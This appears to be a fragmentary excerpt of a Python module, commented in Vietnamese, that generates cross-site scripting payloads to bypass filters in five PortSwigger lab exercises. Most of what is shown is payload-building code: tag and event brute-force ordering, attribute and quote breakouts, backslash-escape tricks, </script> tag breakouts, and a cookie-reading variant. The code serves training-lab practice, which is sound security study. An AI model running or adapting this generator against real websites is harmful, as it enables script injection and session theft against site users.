...
Logic giữ nguyên hoàn toàn so với bản gốc.
Thay đổi duy nhất: payload list được viết lại sạch hơn, tập trung đúng
các strategy cần thiết để bypass 5 lab PortSwigger — không thêm payload
"exotic" không cần thiết.
...
# ---------------------------------------------------------------------------
# Build payload từ (tag, event) combo — giữ nguyên logic gốc
# ---------------------------------------------------------------------------

def _combo_to_payloads(tag: str, event: str) -> list[Payload]:
    """
    Từ combo (tag, event) đã được brute-force xác nhận,
    sinh ra các payload hiệu quả nhất.
    """
    ...
    # print() variant — đặc biệt quan trọng cho onresize (Test 1)
    if event == "onresize":
        payloads.append(Payload(
    ...
    # id= variant cho focus/toggle (Test 2 trigger qua #x)
    ...
    # cookie variant cho xss custom tag (Test 2)
...
def _prioritize_combos(combos: list[tuple[str, str]]) -> list[tuple[str, str]]:
    """
    Sắp xếp (tag, event) theo khả năng exploit:
    1. Auto-trigger events trước
    2. Tags đơn giản/phổ biến trước
    3. Interaction-required sau
    """
    TAG_PREF = [
        "body", "svg", "img", "input", "details",
        "xss", "x",          # custom tags (Test 2)
        "script",
    ]
...
def _html_payloads(fm: FilterMap, **_) -> list[Payload]:
    ...
    if fm.allowed_combos:
        ...
        if fm.body_events == Behavior.ALLOWED:
            out += [
                ...
                Payload(f"<body onresize={_e(0)}>",
                        "body_onresize",   "html"),
                Payload(f"<body onpageshow={_e(0)}>",
                        "body_onpageshow", "html"),
            ]
    ...
    # 3. Fallback srcdoc / js-uri khi không có event nào
    no_events = (
...
def _attribute_payloads(fm: FilterMap, meta: AttributeMeta, **_) -> list[Payload]:
    ...
    # Xác định quote char để breakout
    ...
    if breakout:
        ...
        # Test 3: inject event handler — breakout khỏi attribute value
        ...
        # Nếu angles cũng OK → full tag injection
        if _tags_ok(fm):
            if _script_ok(fm):
            ...
            # Brute-force combos trong attribute context (sau breakout)
            if fm.allowed_combos:
                for tag, event in _prioritize_combos(fm.allowed_combos):
...
# ---------------------------------------------------------------------------
# JS context payloads — Test 4 & Test 5
# ---------------------------------------------------------------------------
...
def _js_payloads(fm: FilterMap, js_quote_char: str = "", **_) -> list[Payload]:
    ...
    # Raw JS (không trong string)
    if js_quote_char == "" and sq_free and dq_free:
        raw_js += [
            Payload(_e(0), "raw_js_direct", "js", "marker in raw JS"),
            Payload(_e(2), "raw_js_print",  "js"),
        ]

    # Single quote free
    if sq_free:
        sq_pay += [
            Payload(f"'-{_e(0)}-'",   "sq_arithmetic", "js"),
            Payload(f"';{_e(0)}//",   "sq_terminate",  "js"),
            Payload(f"';{_e(1)}//",   "sq_confirm",    "js"),
            Payload(f"'||{_e(0)}||'", "sq_or",         "js"),
        ]

    # Double quote free
    if dq_free and not sq_free:
        dq_pay += [
            Payload(f'"-{_e(0)}-"',   "dq_arithmetic", "js"),
            Payload(f'";{_e(0)}//',   "dq_terminate",  "js"),
            Payload(f'"||{_e(0)}||"', "dq_or",         "js"),
        ]

    # -------------------------------------------------------------------
    # Backslash + single quote escaped — Test 5
    #
    # Có 2 scenario khi single_quote=ESCAPED:
    #
    # Scenario A — backslash=ALLOWED (lab thực tế, payload mẫu: \'-alert(1)//):
    #   Server chỉ escape ' nhưng KHÔNG touch backslash.
    #   Inject: \'  → server giữ \ rồi escape ' thành \\'
    #   Kết quả JS source: \\\'  → JS parse: \\\ = literal \, rồi ' kết thúc string
    #   BREAKOUT!
    #
    # Scenario B — backslash=DOUBLED:
    #   Server double \ → \\ VÀ escape ' → \\
    #   Inject: \'  → server biến thành \\\\'
    #   JS parse tương tự → BREAKOUT!
    #
    # Cả 2 scenario dùng cùng payload: \' (1 backslash + quote)
    # → Sinh payload này khi sq_escaped, bất kể bs_doubled hay không.
    # -------------------------------------------------------------------
    if sq_escaped:
        # Payload mẫu lab: \'-alert(1)//
        # Thử alert → confirm → print vì một số Chromium context suppress alert()
        bs_pay += [
            Payload(f"\\'-alert(1)//",              "bs_sq_alert",       "js",
                    r"Test 5: \'-alert(1)// — exact lab sample"),
            Payload(f"\\'-confirm(1)//",            "bs_sq_confirm",     "js",
                    r"Test 5: confirm() — less likely suppressed"),
            Payload(f"\\'-print()//",               "bs_sq_print",       "js",
                    r"Test 5: print() variant"),
            Payload(f"\\'-alert(document.cookie)//","bs_sq_cookie",      "js",
                    "Test 5: steal cookie"),
            Payload(f"\\';alert(1)//",              "bs_sq_semi_alert",  "js",
                    r"Test 5: semicolon separator variant"),
            Payload(f"\\';confirm(1)//",            "bs_sq_semi_confirm","js",
    ...
    if bt_free:
        bt_pay += [
            Payload(f"`-{_e(0)}-`",  "bt_arithmetic", "js"),
            Payload(f"`;{_e(0)}//",  "bt_terminate",  "js"),
            Payload(f"${{{_e(0)}}}", "template_expr",  "js"),
        ]

    # Test 4: tag breakout — đóng </script> và mở script mới
    all_quotes_blocked = not sq_free and not dq_free and not bt_free and not bs_doubled
    if _tags_ok(fm) and (all_quotes_blocked or True):  # luôn thử nếu angles OK
        if _script_ok(fm):
            tag_pay.append(Payload(
                f"</script><script>{_e(0)}</script>",
                "script_tag_breakout", "js",
                "Test 4: close current script tag, open new one",
            ))
            tag_pay.append(Payload(
                f"</script><script>{_e(1)}</script>",
                "script_tag_breakout_confirm", "js",
            ))
        if _events_ok(fm):
            tag_pay += [
                Payload(f"</script><img src=x onerror={_e(0)}>",
                        "script_img_breakout", "js"),
                Payload(f"</script><svg onload={_e(0)}>",
                        "script_svg_breakout", "js"),
            ]

    # Thứ tự payload theo js_quote_char
    if js_quote_char == "'":
